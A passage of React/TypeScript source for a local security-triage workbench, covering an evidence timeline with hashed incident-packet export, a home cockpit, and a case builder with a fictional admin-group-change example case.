 const drag=useRef<any>(null);const raf=useRef(0);const latest=useRef<any>(null);
 const place=(x:number,y:number)=>{if(snap){x=Math.round(x/5)*5;y=Math.round(y/5)*5}return{x:Math.max(0,Math.min(92,x)),y:Math.max(0,Math.min(92,y))}};
 const pct=(e:any)=>{const b=ref.current!.getBoundingClientRect();return{x:(e.clientX-b.left)/b.width*100,y:(e.clientY-b.top)/b.height*100}};
 const down=(n:Note)=>(e:any)=>{e.preventDefault();try{e.currentTarget.setPointerCapture(e.pointerId)}catch(err){}
   onSel(n.id);const p=pct(e);drag.current={id:n.id,dx:p.x-n.x,dy:p.y-n.y};dragRef.current=true;latest.current={id:n.id,x:n.x,y:n.y};setLive({...latest.current})};
 const move=(e:any)=>{if(!drag.current)return;const p=pct(e);const d=drag.current;const q=place(p.x-d.dx,p.y-d.dy);latest.current={id:d.id,x:q.x,y:q.y};
   if(!raf.current)raf.current=requestAnimationFrame(()=>{raf.current=0;setLive({...latest.current})})};
 const up=()=>{if(!drag.current)return;if(raf.current){cancelAnimationFrame(raf.current);raf.current=0}const f=latest.current;drag.current=null;dragRef.current=false;setLive(null);
   onCommit(notes.map((n:Note)=>n.id===f.id?{...n,x:f.x,y:f.y}:n))};
 const key=(n:Note)=>(e:any)=>{const st=e.shiftKey?6:2;const m:any={ArrowLeft:[-st,0],ArrowRight:[st,0],ArrowUp:[0,-st],ArrowDown:[0,st]}[e.key];if(!m)return;e.preventDefault();const q=place(n.x+m[0],n.y+m[1]);onSel(n.id);onCommit(notes.map((k:Note)=>k.id===n.id?{...k,x:q.x,y:q.y}:k))};
 return <div className={'board'+(grid?'':' ng')+(tgt?' tgt-on':'')} ref={ref} onPointerMove={move} onPointerUp={up} onPointerCancel={up}>
   {QL.map((q:string,i:number)=><div key={q} className={'qd q'+i}><span className="qn">{q}</span></div>)}
   <div className="ax" style={{left:6,bottom:4}}>← low effort</div><div className="ax" style={{right:6,bottom:4}}>high effort →</div><div className="ax" style={{left:'50%',top:4,transform:'translateX(-50%)'}}>↑ high impact</div>
   {notes.map((n:Note)=>{const L=live&&live.id===n.id;const x=L?live.x:n.x,y=L?live.y:n.y;const q=QL[quad({...n,x,y})];
     return <div key={n.id} role="button" tabIndex={0} aria-label={n.t+', '+q+'. Arrow keys move it.'} className={'note '+n.shape+(sel===n.id?' sel':'')+(L?' drag':'')} style={{left:x+'%',top:y+'%',background:n.col}} onPointerDown={down(n)} onKeyDown={key(n)} onFocus={()=>onSel(n.id)}>
       {n.t}{(n.votes>0||n.cm.length>0)&&<span className="vt">{n.votes>0?'👍 '+n.votes:''}{n.votes>0&&n.cm.length>0?'  ':''}{n.cm.length>0?'💬 '+n.cm.length:''}</span>}</div>})}
 </div>}

// ---- Investigation timeline: events are local evidence leads, never automatic verdicts ----
const TRACE_KINDS=['detection','observation','analysis','containment','recovery'];
const eventStamp=(x:TimelineEvent):number=>{const ms=Date.parse(x.at||'');return Number.isFinite(ms)?ms:Infinity};
const traceSorted=(xs:TimelineEvent[])=>xs.slice().sort((a,b)=>{const ta=eventStamp(a),tb=eventStamp(b);return ta===tb?a.id.localeCompare(b.id):!Number.isFinite(ta)?1:!Number.isFinite(tb)?-1:ta-tb});
const showStamp=(v:string)=>{const n=Date.parse(v||'');return Number.isFinite(n)?new Date(n).toLocaleString():v||'TIME NOT RECORDED'};
const csvQuote=(x:any)=>{let v=String(x===undefined?'':x);if(/^[=+\-@\t\r]/.test(v))v="'"+v;return '"'+v.replace(/"/g,'""')+'"'};
function traceCsv(xs:TimelineEvent[]):string{const keys=['id','timestamp','category','summary','asset','actor','source','analyst_note','raw_truncated'];const rows=traceSorted(xs).map(x=>[x.id,x.at,x.kind,x.summary,x.asset,x.actor,x.source,x.note,x.truncated?'yes':'no']);return [keys.map(csvQuote).join(','),...rows.map(r=>r.map(csvQuote).join(','))].join('\r\n')+'\r\n'}
const traceText=(xs:TimelineEvent[])=>traceSorted(xs).map(x=>'- '+showStamp(x.at)+' · '+x.kind.toUpperCase()+' · '+x.summary+(x.asset?' · '+x.asset:'')+(x.actor?' · actor: '+x.actor:'')+' (source: '+(x.source||'UNSPECIFIED')+')'+(x.note?'\n  - Analyst note: '+x.note:'')).join('\n')||'- No individual events recorded';
async function fileSha256(s:string):Promise<string>{const api=globalThis.crypto&&globalThis.crypto.subtle;if(!api)throw Error('SHA-256 is not available here. Open the app at localhost to create a verified export.');const bytes=new TextEncoder().encode(s);const digest=await api.digest('SHA-256',bytes);return Array.from(new Uint8Array(digest)).map(x=>x.toString(16).padStart(2,'0')).join('')}
async function incidentBundle(s:St):Promise<Blob>{
 const c:any={...s};delete c.pbs;delete c.runs;
 const files=[{name:'report/incident-report.md',data:md(s)},{name:'evidence/timeline.csv',data:traceCsv(s.timeline||[])},{name:'evidence/case-snapshot.json',data:JSON.stringify(c,null,2)}];
 const hashes:any={};for(const f of files)hashes[f.name]=await fileSha256(f.data);
 const manifest={format:'spectacle-soc-incident-packet',version:1,createdAt:new Date().toISOString(),caseName:s.name||'Untitled',timelineEvents:(s.timeline||[]).length,evidenceItems:s.evidence.length,hashAlgorithm:'SHA-256',fileHashes:hashes,notice:'Hashes detect subsequent changes to exported files; they do not prove who collected the source events or establish legal chain of custody. Raw source events may be truncated. The snapshot contains potentially sensitive evidence.'};
 return makeZip([...files,{name:'manifest.json',data:JSON.stringify(manifest,null,2)}]);
}
function Timeline({s,up,go,targetEvent}:any){
 const list:TimelineEvent[]=Array.isArray(s.timeline)?s.timeline:[];
 const [query,setQuery]=useState('');const [kind,setKind]=useState('all');const [asset,setAsset]=useState('all');const [selected,setSelected]=useState('');const [notice,setNotice]=useState('');const [edit,setEdit]=useState(false);const [busy,setBusy]=useState(false);const [replay,setReplay]=useState(0);const [playing,setPlaying]=useState(false);
 const [stamp,setStamp]=useState(()=>{const d=new Date();const z=new Date(d.getTime()-d.getTimezoneOffset()*60000);return z.toISOString().slice(0,16)});
 const [summary,setSummary]=useState('');const [k,setK]=useState('observation');const [host,setHost]=useState('');const [actor,setActor]=useState('');const [source,setSource]=useState('');const [note,setNote]=useState('');
 const sorted=traceSorted(list);
 useEffect(()=>{if(targetEvent&&list.some(x=>x.id===targetEvent)){setSelected(targetEvent);const timer=setTimeout(()=>{const el=Array.from(document.querySelectorAll('.trace-event')).find(n=>n.getAttribute('data-trace-key')===targetEvent);el?.scrollIntoView({behavior:'smooth',block:'center'})},220);return()=>clearTimeout(timer)}},[targetEvent]);
 useEffect(()=>{if(!playing)return;if(replay>=sorted.length-1){setPlaying(false);return}const t=setTimeout(()=>setReplay(i=>i+1),1400);return()=>clearTimeout(t)},[playing,replay,sorted.length]);
 const replayCurrent=sorted[Math.min(replay,Math.max(0,sorted.length-1))];
 const stepReplay=(next:number)=>{setPlaying(false);const n=Math.max(0,Math.min(sorted.length-1,next));setReplay(n);if(sorted[n])setSelected(sorted[n].id)};
 const hosts=[...new Set(list.map(x=>x.asset).filter(Boolean))].sort();
 const filtered=sorted.filter(x=>(kind==='all'||x.kind===kind)&&(asset==='all'||x.asset===asset)&&(!query||[x.summary,x.asset,x.actor,x.source,x.note,x.at,x.raw].join(' ').toLowerCase().includes(query.toLowerCase())));
 const countMissing=list.filter(x=>!Number.isFinite(Date.parse(x.at||''))).length;
 const matched=list.filter(x=>x.kind==='detection').length;
 const add=()=>{if(!summary.trim()||!source.trim()||!stamp){setNotice('Add an event description, timestamp, and source before saving.');return}
  const parsed=new Date(stamp);if(!Number.isFinite(parsed.getTime())){setNotice('Enter a valid timestamp.');return}const at=parsed.toISOString();
  const ev:TimelineEvent={id:'manual-'+Date.now()+'-'+hash32(summary+source),at,kind:k,summary:summary.trim(),asset:host.trim(),actor:actor.trim(),source:source.trim(),note:note.trim(),raw:''};
  up({timeline:[...list,ev]});setSelected(ev.id);setEdit(false);setSummary('');setNote('');setNotice('Timeline entry saved in this case.')};
 const patch=(id:string,v:Partial<TimelineEvent>)=>up({timeline:list.map(x=>x.id===id?{...x,...v}:x)});
 const promote=(x:TimelineEvent)=>{const text=x.summary.slice(0,250);const src=x.source+(x.at?' · '+showStamp(x.at):'')+(x.asset?' · '+x.asset:'');
  if(s.evidence.some((e:Evid)=>e.t===text&&e.g===src)){setNotice('This event is already in the evidence list.');return}
  up({evidence:[...s.evidence,{k:'Log',t:text,g:src}]});setNotice('Event linked to the case evidence list. Verify the source details.');};
 const download=(fmt:string)=>{const t=fmt==='csv'?traceCsv(list):JSON.stringify({format:'spectacle-soc-timeline',version:1,case:s.name,exportedAt:new Date().toISOString(),events:traceSorted(list)},null,2);downloadBlob(new Blob([t],{type:fmt==='csv'?'text/csv':'application/json'}),'spectacle-timeline.'+fmt);setNotice('Exported all '+list.length+' events, not just filtered results.');};
 const packet=async()=>{if(busy)return;setBusy(true);try{const zip=await incidentBundle(s);downloadBlob(zip,'spectacle-incident-packet.zip');setNotice('Incident packet exported with SHA-256 manifest. Protect the file; it may contain sensitive information.')}catch(e:any){setNotice(e.message||'Unable to export packet.')}finally{setBusy(false)}};
 const timePoints=sorted.filter(x=>Number.isFinite(eventStamp(x)));const t0=timePoints.length?eventStamp(timePoints[0]):0;const t1=timePoints.length?eventStamp(timePoints[timePoints.length-1]):0;const span=Math.max(1,t1-t0);const bins=Array(18).fill(0);
 timePoints.forEach(x=>{const i=Math.min(17,Math.floor((eventStamp(x)-t0)/span*17.999));bins[i]++});const peak=Math.max(1,...bins);
 return <div className="timeline-page"><div className="trace-hero"><div><span className="trace-eyebrow">INVESTIGATION / CHRONOLOGY</span><h1>Evidence timeline</h1><p>Turn alert matches into a source-attributed working chronology. Source events, analyst notes, and containment decisions in one place.</p><span className="trace-disclaimer">LOCAL CASE DATA · NOT A LIVE SECURITY FEED</span></div><div className="trace-hero-stat"><strong>{list.length}</strong><span>recorded events</span><small>{matched} imported detection records · {countMissing} missing timestamp</small></div></div>
 <div className="trace-topcards"><div><b>{list.length?showStamp(sorted[0].at):'—'}</b><span>Earliest recorded event</span></div><div><b>{timePoints.length?showStamp(timePoints[timePoints.length-1].at):'—'}</b><span>Latest timed event</span></div><div><b>{hosts.length}</b><span>Affected hosts in event trail</span></div></div>
 <div className="trace-panel"><div className="trace-section-top"><div><h2>Activity distribution</h2><p className="s">Events by time within this case; relative distribution only, not monitoring.</p></div><button className="b" onClick={()=>go('hunt')}>Run another hunt</button></div>
 <div className="trace-histogram" aria-label={'Histogram of '+timePoints.length+' timestamped timeline events'}>{bins.map((x:number,i:number)=><div key={i} className="trace-bin" title={x+' event(s)'}><span style={{height:(x?Math.max(10,x/peak*100):2)+'%'}}/></div>)}</div><div className="trace-axis"><span>{t0?showStamp(timePoints[0].at):'No timestamps yet'}</span><span>{t1?showStamp(timePoints[timePoints.length-1].at):''}</span></div></div>
 {sorted.length>0&&<div className="trace-replay trace-panel"><div className="trace-section-top"><div><h2>Investigation replay</h2><p className="s">Step through captured records in event order. Playback is a local review aid, not real-time data.</p></div><span className="trace-replay-count">{Math.min(replay+1,sorted.length)} / {sorted.length}</span></div>
 <div className="trace-replay-track" role="progressbar" aria-valuenow={replay+1} aria-valuemin={1} aria-valuemax={sorted.length} aria-label="Investigation replay progress"><span style={{width:((replay+1)/sorted.length*100)+'%'}}/></div><div className="trace-replay-summary"><span>{replayCurrent?showStamp(replayCurrent.at):''}</span><b>{replayCurrent?replayCurrent.summary:''}</b></div>
 <div className="trace-replay-controls"><button aria-label="Previous event" className="b" disabled={replay===0} onClick={()=>stepReplay(replay-1)}>← Prev</button><button className="b pk" disabled={sorted.length<2} onClick={()=>{if(playing){setPlaying(false)}else{if(replay>=sorted.length-1)setReplay(0);setPlaying(true)}}}>{playing?'Pause replay':'Play sequence'}</button><button aria-label="Next event" className="b" disabled={replay>=sorted.length-1} onClick={()=>stepReplay(replay+1)}>Next →</button></div></div>}
 <div className="trace-toolbar"><input aria-label="Search timeline events" placeholder="Search events, actors, assets, raw records…" value={query} onChange={e=>setQuery(e.target.value)}/><select aria-label="Filter by event type" value={kind} onChange={e=>setKind(e.target.value)}><option value="all">All activity</option>{TRACE_KINDS.map(x=><option key={x} value={x}>{x}</option>)}</select><select aria-label="Filter by asset" value={asset} onChange={e=>setAsset(e.target.value)}><option value="all">All assets</option>{hosts.map(x=><option key={x}>{x}</option>)}</select></div>
 <div className="trace-actions"><button className="b pk" onClick={()=>setEdit(!edit)}>{edit?'Close entry form':'+ Add timeline event'}</button><button className="b" onClick={()=>download('csv')} disabled={!list.length}>Export CSV</button><button className="b" onClick={()=>download('json')} disabled={!list.length}>Export JSON</button><button className="b" onClick={packet} disabled={busy}>{busy?'Building packet…':'Incident packet ZIP'}</button></div>
 {notice&&<div className="w" role="status">{notice}</div>}
 {edit&&<div className="trace-entry trace-panel"><h2>Record an observation or action</h2><p className="s">Manual entries are analyst-authored. Include when the action actually happened and where that information came from.</p><div className="trace-form"><label>Timestamp (your local time)<input aria-label="New event timestamp" type="datetime-local" value={stamp} onChange={e=>setStamp(e.target.value)}/></label><label>Event type<select aria-label="New event type" value={k} onChange={e=>setK(e.target.value)}>{TRACE_KINDS.filter(x=>x!=='detection').map(x=><option key={x}>{x}</option>)}</select></label><label className="trace-wide">What happened?<input aria-label="New event description" placeholder="e.g. isolated FIN-WS22 after approval" value={summary} onChange={e=>setSummary(e.target.value)}/></label><label>Asset / host<input aria-label="New event asset" value={host} onChange={e=>setHost(e.target.value)} placeholder="FIN-WS22"/></label><label>Actor / owner<input aria-label="New event actor" value={actor} onChange={e=>setActor(e.target.value)} placeholder="Analyst or account"/></label><label className="trace-wide">Source or ticket reference<input aria-label="New event source" value={source} onChange={e=>setSource(e.target.value)} placeholder="EDR console / IR-1042 / analyst observation"/></label><label className="trace-wide">Analyst note<textarea aria-label="New event note" rows={3} value={note} onChange={e=>setNote(e.target.value)} placeholder="Reasoning, approval, gaps…"/></label></div><button className="b pk" onClick={add}>Save event</button></div>}
 <div className="trace-section-top"><div><h2>Event trail <span className="trace-count">{filtered.length} of {list.length}</span></h2><p className="s">Sorted by timestamp. Missing timestamps are shown last. Click any record to inspect details.</p></div></div>
 {!list.length&&<div className="trace-empty"><b>No source events in this case yet.</b><p>Load sample or real JSON events in Hunt, run detections, and select “open as case.” Or add an observation manually.</p><button className="b pk" onClick={()=>go('hunt')}>Open Hunt →</button></div>}
 {!!list.length&&!filtered.length&&<div className="trace-empty"><b>No records match these filters.</b><button className="b" onClick={()=>{setQuery('');setKind('all');setAsset('all')}}>Clear filters</button></div>}
 <div className="trace-list">{filtered.map((x:TimelineEvent,i:number)=><div className={'trace-event '+(selected===x.id?'active':'')+(replayCurrent&&replayCurrent.id===x.id?' replay-active':'')} data-trace-key={x.id} key={x.id}>
 <div className="trace-spine"><span className={'trace-dot trace-'+x.kind}/></div><div className="trace-item"><button className="trace-event-head" onClick={()=>setSelected(selected===x.id?'':x.id)} aria-expanded={selected===x.id}><span className="trace-time">{showStamp(x.at)}</span><span className={'trace-kind trace-'+x.kind}>{x.kind}</span><strong>{x.summary}</strong><span className="trace-chevron">{selected===x.id?'−':'+'}</span></button>
 <div className="trace-chips">{x.asset&&<span>HOST · {x.asset}</span>}{x.actor&&<span>ACTOR · {x.actor}</span>}<span>SOURCE · {x.source||'MISSING'}</span>{x.truncated&&<span>RAW TRUNCATED</span>}</div>
 {selected===x.id&&<div className="trace-detail"><div className="trace-detail-actions"><button className="b" onClick={()=>promote(x)}>Add to case evidence</button><button className="b" onClick={()=>{if(window.confirm('Remove this event from the case timeline?')){up({timeline:list.filter(v=>v.id!==x.id)});setSelected('')}}}>Remove event</button></div><label>Analyst annotation<textarea aria-label="Annotation for selected event" rows={3} value={x.note} onChange={e=>patch(x.id,{note:e.target.value})}/></label>{x.raw?<details><summary>Inspect captured raw source event {x.truncated?'(truncated at the capture limit)':''}</summary><pre>{x.raw}</pre></details>:<p className="s">Manual entry · no raw source event attached.</p>}<p className="s">The record is editable and locally stored. This is an analyst working timeline, not a tamper-proof audit log.</p></div>}
 </div></div>)}</div><p className="s" style={{marginTop:22}}>Hunt captures up to 120 matching events per case. Each raw record is capped at 4,000 characters and the full set has a 150,000-character raw-data budget; truncated items are labeled. CSV/JSON exports include the stored timeline, not original full log files. The incident packet hashes exported files but does not authenticate the underlying source.</p>
 </div>
}

// ---- Home ----
function Home({go,s,openSearch}:any){const M=[['01','facts first','write what you saw, not what you think it means. the verdict comes last.'],['02','show the evidence','every indicator gets a source. no source, no weight.'],['03','map it','tie each finding to an att&ck tactic so the gap is visible.'],['04','contain or accept','say what you contained. say what you are choosing not to chase.'],['05','version the playbook','edit, check, approve. every run records the version it used.']];
return <div><h1 className="mega">triage with a pulse.</h1><div className="two"><div><p className="lead">feed spectacle an alert. get back a ranked, evidence-first case and a bouncer that stops six common analyst mistakes at the door. playbooks are versioned, so every run says which one it used.</p><p className="s">a workbench for analysts, not a siem. imported log files are processed locally in your browser; nothing is monitored in the background.</p></div><div className="row" style={{gap:24}}><button className="b pk" onClick={()=>go('case')}>open a case</button><button className="b" onClick={()=>go('timeline')}>view investigation trail</button></div></div>
<section className="cockpit" aria-label="Your local SOC workspace">
 <div className="cockpit-top"><div><span className="eyebrow"><span className="live-dot"/> YOUR WORKSPACE · LOCAL SNAPSHOT</span><h2>Analyst cockpit</h2><p>{s.name?s.name:'Start a case to populate this cockpit.'}</p></div><button className="cc-search" onClick={openSearch} aria-label="Search your SOC workspace"><span className="cc-search-label">Search workspace</span> <kbd>⌘ K</kbd></button></div>
 <div className="cockpit-metrics"><button onClick={()=>go('case')}><strong>{s.findings.filter((f:Finding)=>f.t.trim()).length}</strong><span>documented findings</span></button><button onClick={()=>go('case')}><strong>{s.evidence.filter((e:Evid)=>e.t.trim()).length}</strong><span>evidence items</span></button><button onClick={()=>go('playbooks')}><strong>{s.pbs.length}</strong><span>playbooks</span></button><button onClick={()=>go('runs')}><strong>{s.runs.filter((r:Run)=>!r.done).length}</strong><span>active runs</span></button></div>
 <div className="cockpit-bottom"><div><b>Case readiness</b><span>{checks(s).filter((x:any)=>x.ok).length} of 6 evidence-quality checks passed</span></div><div className="cockpit-track" role="progressbar" aria-label="Case readiness" aria-valuenow={Math.round(checks(s).filter((x:any)=>x.ok).length/6*100)} aria-valuemin={0} aria-valuemax={100}><span style={{width:(checks(s).filter((x:any)=>x.ok).length/6*100)+'%'}}/></div><button className="cc-text" onClick={()=>go(s.findings.length?'dash':'case')}>Review case →</button></div>
 <div className="trace-home-strip"><div><span className="trace-mini-tag">INVESTIGATION TRAIL</span><strong>{(s.timeline||[]).length} captured events</strong><small>Inspect source records, reconstruct the sequence, and export a hashed incident packet.</small></div><button className="b" onClick={()=>go('timeline')}>Open timeline ↗</button></div>
 </section>
<div className="tick"><span>facts first / show the evidence / map it / contain or accept / version the playbook /&nbsp;</span></div>
<div className="stage"><Char/></div>{M.map((m:string[])=><div className="idx" key={m[0]} onClick={()=>go(m[0]==='05'?'playbooks':'case')}><span>{m[0]}</span><b>{m[1]}</b><p>{m[2]}</p></div>)}
<div style={{borderTop:'1px solid var(--ink)',padding:'80px 0 20px'}}><button className="b mega2" onClick={()=>go('case')}>start a case →</button></div></div>}

// ---- Case builder ----
function Case({s,up,go}:any){const [inp,setInp]=useState('');const [ok,setOk]=useState('');const [na,setNa]=useState('');
const ch:Msg[]=s.chat.length?s.chat:[{r:'sal',t:Q[0][1]}];const end=useRef<HTMLDivElement>(null);useEffect(()=>{end.current&&end.current.scrollIntoView({block:'nearest'})},[ch.length]);
const splitList=(t:string)=>t.split(/[,\n;]/).map((x:string)=>x.trim()).filter(Boolean);
const send=()=>{const t=inp.trim();if(!t||s.ci>=Q.length)return;const k=Q[s.ci][0];const c=[...ch,{r:'me',t}];setInp('');
 if(k==='problem'&&CONC.test(t)&&!s.pushed){up({pushed:true,chat:[...c,{r:'sal',t:"That's a verdict wearing a fact costume. What did you actually observe: events, logs, who did what?"}]});return}
 const p:any={};
 if(k==='assets')p.assets=[...new Set([...s.assets,...splitList(t)])];
 else if(k==='evidence'){const f=extractIocs(t);p.evidence=[...s.evidence,...(f.length?f.slice(0,5).map((x:any)=>({k:'IOC',t:x.t,g:'intake chat'})):[{k:'Context',t:t.slice(0,200),g:'intake chat'}])]}
 else if(k==='contain'){if(!/^(none|nothing|no)\b/i.test(t))p.actions=[...s.actions,{t,b:'contain'}]}
 else p[k]=t;
 const ci=s.ci+1;up({...p,ci,chat:[...c,{r:'sal',t:ci<Q.length?Q[ci][1]:'Case skeleton done. Scroll down, add findings, and sharpen it.'}]})};
const upF=(i:number,p:Partial<Finding>)=>up({findings:s.findings.map((x:Finding,j:number)=>j===i?{...x,...p}:x)});
const upE=(i:number,p:Partial<Evid>)=>up({evidence:s.evidence.map((x:Evid,j:number)=>j===i?{...x,...p}:x)});
const upA=(i:number,p:Partial<Act>)=>up({actions:s.actions.map((x:Act,j:number)=>j===i?{...x,...p}:x)});
const addAsset=()=>{const l=splitList(na);if(!l.length)return;up({assets:[...new Set([...s.assets,...l])]});setNa('')};
const dropAsset=(a:string)=>up({assets:s.assets.filter((x:string)=>x!==a),findings:s.findings.map((f:Finding)=>({...f,a:f.a.filter((x:string)=>x!==a)}))});
const sugg=()=>{const e=[...s.evidence];[...new Set(s.findings.map((x:Finding)=>x.th))].forEach((t:any)=>{(EVD[t]||[]).forEach((x:string)=>{if(!e.some((q:Evid)=>q.t===x))e.push({k:'Log',t:x,g:''})})});if(e.length===s.evidence.length&&!s.findings.length)e.push({k:'Log',t:'Alert raw event with timestamps',g:''});up({evidence:e})};
const seed=()=>{const r=[...s.actions];scored(s).forEach((x:any)=>{const t=(x.c==='open'?'Contain: ':x.c==='partial'?'Finish mitigating: ':'Monitor: ')+x.t;if(!r.some((q:Act)=>q.t===t))r.push({t,b:x.c==='contained'?'monitor':'contain'})});up({actions:r})};
const plot=()=>{const n=scored(s).map((x:any,i:number)=>({id:Date.now()+i,t:x.t.slice(0,30),x:(x.c==='open'?10:x.c==='partial'?44:68)+(i*9)%22,y:Math.max(8,Math.min(82,88-x.sc*3.2)),col:SV[i%6],shape:'sq',votes:0,cm:[]}));up({notes:[...s.notes,...n]});go('triage')};
const cp=()=>{const t=md(s);track('case.copied');try{navigator.clipboard.writeText(t).then(()=>setOk('Copied'),()=>setOk('Select the text below to copy'))}catch(e){setOk('Select the text below to copy')}};
const load=()=>up({name:'Suspicious admin group change',cat:'Windows event 4728, Windows Security log',assets:['FIN-DC01','FIN-WS22','svc-backup'],goal:'Decide: true positive, benign, or escalate?',problem:'At 02:14 UTC the account svc-backup was added to the Domain Admins group from host FIN-WS22. No change ticket was found. The same account logged on interactively at 02:09 UTC from 203.0.113.50.',why:'A service account with domain admin rights can reach every server and the backup vault.',whynow:'Group change at 02:14 UTC, alert raised at 02:16 UTC, analyst picked it up at 08:40 UTC.',findings:[{t:'Service account added to Domain Admins',c:'open',s:5,th:'Persistence',a:['FIN-DC01','svc-backup']},{t:'Interactive logon by a service account',c:'open',s:4,th:'Credential Access',a:['svc-backup','FIN-WS22']},{t:'Logon from an external IP',c:'partial',s:3,th:'Initial Access',a:['svc-backup']},{t:'Backup vault reachable with the new rights',c:'partial',s:4,th:'Lateral Movement',a:['FIN-DC01','svc-backup']}],evidence:[{k:'IOC',t:'203.0.113.50',g:'VPN logs'},{k:'Log',t:'Event 4728 on FIN-DC01 at 02:14 UTC',g:'Windows Security log'},{k:'Context',t:'No change ticket found for svc-backup',g:'ticket search'}],timeline:[],actions:[{t:'Remove svc-backup from Domain Admins',b:'contain'},{t:'Reset svc-backup credentials',b:'eradicate'},{t:'Watch svc-backup logons for 7 days',b:'monitor'},{t:'Do not wipe FIN-WS22 until forensics has a copy',b:'accept'}],pushed:true,ci:7,chat:[{r:'sal',t:'Example case loaded.'}]});
const bad=!!s.problem.trim()&&CONC.test(s.problem);
return <div><h1>Case</h1>
<div className="case-trace-callout"><div><span className="trace-mini-tag">CASE EVIDENCE PATH</span><strong>{(s.timeline||[]).length} chronological event{(s.timeline||[]).length===1?'':'s'}</strong><p>{(s.timeline||[]).length?'Matching Hunt records are preserved for review. Annotate the sequence and attach source records to evidence.':'Build an investigation sequence from Hunt matches or manually recorded observations.'}</p></div><button className="b" onClick={()=>go('timeline')}>Inspect event trail ↗</button></div>
<div className="card"><div className="s">Mistake radar (tap to jump)</div><div className="row">{checks(s).map((c:any)=><span key={c.n} className={'pill '+(c.ok?'g':'')} onClick={()=>{const e=document.getElementById(c.id);e&&e.scrollIntoView({behavior:'smooth'})}}>{c.ok?'✓':'!'} {c.n}</span>)}</div></div>
<div className="card"><h2>Chat with Sal</h2><p className="s">Scripted intake. No AI guessing.</p><div className="chat">{ch.map((m:Msg,i:number)=><div key={i} className={'bb '+m.r}>{m.t}</div>)}<div ref={end}/></div>{s.ci<Q.length&&<div className="row"><input aria-label="chat message" value={inp} placeholder="Type and hit Enter" onChange={e=>setInp(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')send()}}/><button className="b te" onClick={send}>Send</button></div>}<div className="row" style={{marginTop:8}}><button className="b" onClick={load}>Load example</button><Hold label="Reset case" onDone={()=>up(caseBlank() as any)}/></div></div>
<div className="card" id="sec-facts"><h2>Facts and timeline</h2><p className="s">What you observed. "It was an attacker" is a verdict, not a fact.</p>
<label>Decision to make</label><textarea rows={2} value={s.goal} onChange={e=>up({goal:e.target.value})}/>
<label>What happened? Facts only.</label><textarea rows={3} value={s.problem} onChange={e=>up({problem:e.target.value})}/>
<div className={'w '+(s.problem.trim()&&!bad?'g':'')}>{!s.problem.trim()?'! Write what you observed.':bad?'! That reads like a verdict. Say what you saw and let the evidence decide.':'✓ Reads like facts.'}</div>
<label>Impact if this is real</label><textarea rows={2} value={s.why} onChange={e=>up({why:e.target.value})}/><label>Timeline (add times, like 02:14 UTC)</label><textarea rows={2} value={s.whynow} onChange={e=>up({whynow:e.target.value})}/></div>
<div className="card"><h2>Assets and accounts</h2><p className="s">Anything touched. Findings below pick from this list.</p><div className="row">{s.assets.map((a:string)=><span key={a} className="chip on" role="button" aria-label={'remove '+a} onClick={()=>dropAsset(a)}>{a} ×</span>)}</div>{!s.assets.length&&<p className="s">None yet.</p>}<div className="row" style={{marginTop:8}}><input aria-label="add asset" style={{flex:1,minWidth:150}} value={na} placeholder="host or account, comma separated" onChange={e=>setNa(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')addAsset()}}/><button className="b te" onClick={addAsset}>Add</button></div></div>
<div className="card" id="sec-findings"><h2>Findings and containment</h2><p className="s">Risk = severity × assets hit × containment. Contained counts at 20%.</p>{s.findings.map((p:Finding,i:number)=><div className="card" key={i}><button className="b" style={{float:'right'}} aria-label="remove finding" onClick={()=>up({findings:s.findings.filter((_:any,j:number)=>j!==i)})}>✕</button><input value={p.t} placeholder="What did you find?" onChange={e=>upF(i,{t:e.target.value})}/><select value={p.c} onChange={e=>upF(i,{c:e.target.value})}>{Object.keys(CL).map((k:string)=><option key={k} value={k}>{CL[k]}</option>)}</select><select value={p.th} onChange={e=>upF(i,{th:e.target.value})}>{TACTICS.map((t:string)=><option key={t}>{t}</option>)}</select><label>Severity {p.s}/5</label><input type="range" min={1} max={5} value={p.s} onChange={e=>upF(i,{s:+e.target.value})}/><div className="row">{s.assets.map((a:string)=><span key={a} className={'chip '+(p.a.includes(a)?'on':'')} onClick={()=>upF(i,{a:p.a.includes(a)?p.a.filter((x:string)=>x!==a):[...p.a,a]})}>{a}</span>)}{!s.assets.length&&<span className="s">Add assets above to tag them.</span>}</div></div>)}<button className="b" onClick={()=>up({findings:[...s.findings,{t:'',c:'open',s:3,th:TACTICS[2],a:[...s.assets]}]})}>+ Add finding</button></div>
<div className="card" id="sec-evidence"><h2>Evidence</h2><p className="s">Every item needs a source. At least one indicator. Defanged in the report.</p>{s.evidence.map((m:Evid,i:number)=><div className="card" key={i}><button className="b" style={{float:'right'}} aria-label="remove evidence" onClick={()=>up({evidence:s.evidence.filter((_:any,j:number)=>j!==i)})}>✕</button><select value={m.k} onChange={e=>upE(i,{k:e.target.value})}>{['IOC','Log','Context'].map((k:string)=><option key={k}>{k}</option>)}</select><input value={m.t} placeholder="Indicator, log line or fact" onChange={e=>upE(i,{t:e.target.value})}/><input value={m.g} placeholder="Source (system, query, person)" onChange={e=>upE(i,{g:e.target.value})}/></div>)}<div className="row"><button className="b" onClick={()=>up({evidence:[...s.evidence,{k:'IOC',t:'',g:''}]})}>+ Evidence</button><button className="b" onClick={sugg}>Suggest what to collect</button><button className="b" onClick={()=>go('triage')}>Extract from an alert</button></div></div>
<div className="card" id="sec-actions"><h2>Response actions</h2><p className="s">Contain now, eradicate, monitor, and what you accept or leave out.</p>{s.actions.map((r:Act,i:number)=><div className="card" key={i}><button className="b" style={{float:'right'}} aria-label="remove action" onClick={()=>up({actions:s.actions.filter((_:any,j:number)=>j!==i)})}>✕</button><select value={r.b} onChange={e=>upA(i,{b:e.target.value})}>{Object.keys(AB).map((k:string)=><option key={k} value={k}>{AB[k]}</option>)}</select><input value={r.t} placeholder="Action, in plain words" onChange={e=>upA(i,{t:e.target.value})}/></div>)}<div className="row"><button className="b" onClick={()=>up({actions:[...s.actions,{t:'',b:'contain'}]})}>+ Action</button><button className="b" onClick={seed}>Seed from findings</button></div></div>
<div className="card"><h2>Your report</h2><div className="row"><button className="b te" onClick={cp}>Copy markdown</button><button className="b pk" onClick={plot}>Plot findings on the matrix</button><button className="b" onClick={()=>up({detail:(s.detail||2)%3+1})}>Detail {s.detail||2}/3</button><span className="s">{ok}</span></div><pre style={{marginTop:12}}>{md(s)}</pre></div></div>}

// ---- Playbooks ----
function Playbooks({s,up,auth,lc,targetPb,go}:any){
